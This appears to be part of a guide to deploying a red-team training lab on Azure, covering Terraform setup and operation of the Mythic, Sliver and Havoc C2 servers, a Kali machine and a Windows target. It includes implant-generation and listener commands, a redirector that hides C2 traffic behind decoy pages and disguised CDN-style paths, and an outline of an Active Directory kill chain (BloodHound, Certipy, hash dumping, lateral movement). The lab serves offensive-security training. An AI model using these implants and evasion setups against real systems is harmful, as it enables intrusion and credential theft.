## 3. Azure vs AWS Resource Mapping

| AWS Resource | Azure Resource | Notes |
|---|---|---|
| VPC | Virtual Network (VNet) | Same CIDR planning |
| Subnet | Subnet | Same |
| Internet Gateway | Internet Gateway in VNet | Azure adds it automatically |
| Route Table | Route Table (UDR) | Same concept |
| Security Group | Network Security Group (NSG) | NSG rules are identical in logic |
| EC2 Instance | Virtual Machine (VM) | Same |
| Elastic IP | Public IP (Static SKU) | Same |
| Network Interface | Network Interface (NIC) | Same |
| VPC Peering | VNet Peering | Same — cross-VNet connectivity |
| AMI | Marketplace Image / Custom Image | Debian 12 available; Kali needs custom build |
| Key Pair | SSH Public Key | Azure generates or accepts key material |
| Security Group Rule | NSG Rule | Same allow/deny logic |
| VPC Flow Logs | NSG Flow Logs | Same diagnostic feature |

## 5. Prerequisites (Azure-Specific)

### One-Time Setup

```bash
# 1. Azure CLI installed and logged in
az login

# 2. Terraform >= 1.0 installed
terraform --version

# 3. Create SSH key pair (no AWS Console needed)
ssh-keygen -t rsa -b 4096 -f ~/.ssh/redstack-key -N ""

# 4. Register required resource providers
az provider register --namespace Microsoft.Compute
az provider register --namespace Microsoft.Network

# 5. Kali Linux — Azure does NOT have an official Kali image
# You must build one or use a community image
# Recommended: Packer to build from Kali ISO or use:
#   Offer: kali-linux  Publisher: kali-linux (community)
#   Search: az vm image list --offer kali-linux --all
```

### Create Backend Storage (optional but recommended)

```bash
# Create storage account for Terraform state
az group create --name redstack-tfstate --location eastus
az storage account create --name redstacktfstate --resource-group redstack-tfstate \
  --sku Standard_LRS
az storage container create --name tfstate --account-name redstacktfstate
```

## 6. Step-by-Step Deployment Guide

### Configure

```bash
cd Azure/terraform
cp terraform.tfvars.example terraform.tfvars
```

Edit `terraform.tfvars`:

```hcl
# Required
your_public_ip     = "1.2.3.4/32"       # Your public IP for admin SSH
ssh_public_key     = "~/.ssh/redstack-key.pub"  # Path to public key
redirector_domain  = "c2.yourdomain.com"  # Or leave blank
admin_password     = "YourLabPassword123!"  # VM admin password

# Azure-specific
location           = "eastus"
resource_group_name = "redStack-rg"

# Instance sizes (Azure SKUs)
mythic_vm_size      = "Standard_B2s"
guacamole_vm_size   = "Standard_B1s"
windows_vm_size     = "Standard_B2s"
sliver_vm_size      = "Standard_B1s"
havoc_vm_size       = "Standard_B2s"
redirector_vm_size  = "Standard_B1s"

# Network
vnet_cidr           = "10.50.0.0/16"
redirector_vnet_cidr = "10.60.0.0/16"

# C2 settings
mythic_uri_prefix   = "/cdn/media/stream"
sliver_uri_prefix   = "/cloud/storage/objects"
havoc_uri_prefix    = "/edge/cache/assets"

# Kali
kali_deployment_mode = "headless"
```

### Deploy

```bash
cd Azure/terraform
terraform init
terraform plan
terraform apply
# Type 'yes' when prompted
# Wait 30-60 minutes
```

### Get Credentials

```bash
terraform output deployment_info
```

### Access the Lab

1. **Guacamole Portal:** `https://<guac-public-ip>/guacamole` — login: `guacadmin` / `<admin_password>`
2. Pre-configured connections same as AWS version

### Clean Up

```bash
cd Azure/terraform
terraform destroy
```

## 7. Azure Setup Script Changes

The setup scripts are 90% identical to AWS. Key differences:

### IMDS (Instance Metadata Service)

Azure IMDS is at the same IP (`169.254.169.254`) but uses a different API path:

```bash
# AWS IMDS (v2) — fetches public IP:
IMDS_TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
PUBLIC_IP=$(curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
  http://169.254.169.254/latest/meta-data/public-ipv4)

# Azure IMDS — fetches private IP (Azure VMs have no public IP in IMDS):
PUBLIC_IP=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2021-02-01")
```

**Important:** For the Guacamole userdata script, the public IP must be passed in from Terraform (via `templatefile`) since Azure IMDS does not expose the public IP by default.

### Windows Password

Azure uses a different mechanism. The `password_data` field on AWS EC2 is replaced by direct admin password specification in Azure:

```hcl
# AWS: password encrypted with key pair, decrypted with rsadecrypt
password_data = aws_instance.windows.password_data
windows_password = rsadecrypt(password_data, file(var.ssh_private_key_path))

# Azure: password set directly in VM resource
admin_password = var.admin_password
# Used directly in the VM's OS - no decryption needed
```

### Network Interface Changes

Azure requires explicit creation of NICs with IP configurations:

```hcl
# AWS
resource "aws_network_interface" "mythic" {
  subnet_id       = aws_subnet.training.id
  security_groups = [aws_security_group.mythic.id]
}

# Azure
resource "azurerm_network_interface" "mythic" {
  name                = "mythic-nic"
  location            = azurerm_resource_group.main.location
  resource_group_name = azurerm_resource_group.main.name

  ip_configuration {
    name                          = "internal"
    subnet_id                     = azurerm_subnet.training.id
    private_ip_address_allocation = "Dynamic"
  }
}
```

### Kali Image Note

Azure does not have an official Kali Linux image. Options:

1. **Build with Packer** (recommended):
   ```hcl
   # packer/build-kali-azure.pkr.hcl
   source "azure-arm" "kali" {
     os_type         = "Linux"
     image_publisher = "Debian"
     image_offer     = "debian-12"
     image_sku       = "12-gen2"
     ...
   }
   ```
   Then install Kali packages on top of Debian.

2. **Use community image:** Search the marketplace for `kali-linux` (community-published, use at own risk).

3. **Replace with Parrot OS** or another security-focused distro available on Azure Marketplace.

## 8. Working Guide — Operating the Lab

### Mythic C2

```bash
# Access via Guacamole > "Mythic (SSH)"
ssh -i ~/.ssh/redstack-key admin@<mythic-private-ip>

cd /opt/Mythic
./mythic-cli status

# Web UI: https://mythic:7443 (from Windows via Guacamole)
```

### Sliver C2

```bash
# Access via Guacamole > "Sliver (SSH)"
sliver-client

# Start listener
http --lhost 0.0.0.0 --lport 80

# Generate implant
generate --http https://<redirector-domain>/cloud/storage/objects/ \
  --os windows --arch amd64 --format exe \
  --c2profile redstack --save /tmp/implant.exe
```

### Havoc C2

```bash
# Build once after deploy
~/build_havoc.sh

# Access via Havoc Desktop (VNC) in Guacamole
# Teamserver: localhost:40056
```

### Redirector

```bash
# Test routing
sudo /home/admin/test_redirector.sh

# View logs
sudo tail -f /var/log/apache2/redirector-access.log
```

### Windows & Kali

Same as AWS — RDP via Guacamole, SSH for terminal access.

## 9. Practice How-To Scenarios

### Scenario 1: Deploy First Beacon (Azure)

1. Access Guacamole portal
2. Open "Windows (RDP)" connection
3. From Windows, browse to `https://mythic:7443`
4. Generate Apollo payload, download on Windows
5. Execute payload — watch callback appear at:  
   `sudo tail -f /var/log/apache2/redirector-access.log` on redirector

### Scenario 2: Cross-VNet C2 Pivot

1. Start Sliver listener on port 80
2. Generate implant pointing to `https://<redirector-domain>/cloud/storage/objects/`
3. Deploy on Windows via SCP from Sliver
4. Use Sliver's `socks5` to route traffic through Windows into the TeamServer VNet

### Scenario 3: Test Redirector OPSEC (Azure)

```bash
# Without header — should get decoy page
curl -k https://<redirector-pip>/cdn/media/stream/

# With correct header — should proxy to Mythic
curl -k -H "X-Request-ID: <token>" https://<redirector-pip>/cdn/media/stream/
```

### Scenario 4: Full AD Kill Chain

1. From Kali (via Guacamole): `nmap -sC -sV windows`
2. Deploy Sliver beacon via SMB exec
3. Run BloodHound collector via Sliver
4. Download results to Kali, run BloodHound analysis
5. Execute privilege escalation with Certipy
6. Dump hashes, move laterally

### Scenario 5: Azure-Specific — Test NSG Rules

```azurecli
# Verify NSG rules from Azure CLI
az network nsg rule list --nsg-name mythic-nsg \
  --resource-group redStack-rg --output table

# Add temporary rule for testing
az network nsg rule create --nsg-name mythic-nsg \
  --resource-group redStack-rg --name temp-allow-8080 \
  --protocol Tcp --direction Inbound --priority 200 \
  --source-address-prefixes <your-ip>/32 \
  --destination-port-ranges 8080 --access Allow
```

## 12. Troubleshooting (Azure-Specific)

| Symptom | Fix |
|---------|-----|
| `VMCreationFailed` | Check that the VM SKU is available in your region |
| Kali image not found | Build custom image with Packer |
| Guacamole public IP wrong | Azure IMDS doesn't expose public IP; check Terraform passes it |
| VM can't reach internet | Verify VNet has internet gateway route |
| SSH connection refused | Check NSG allows SSH from your IP + Guacamole subnet |
| Windows never provisions | Azure Windows VMs need 10-15 min for cloud-init |
